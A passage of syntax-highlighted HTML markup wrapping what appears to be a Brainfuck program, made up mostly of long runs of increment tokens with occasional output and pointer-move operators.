inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token operator">.</span><span class="token pointer keyword">></span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment inserted">+</span><span class="token increment 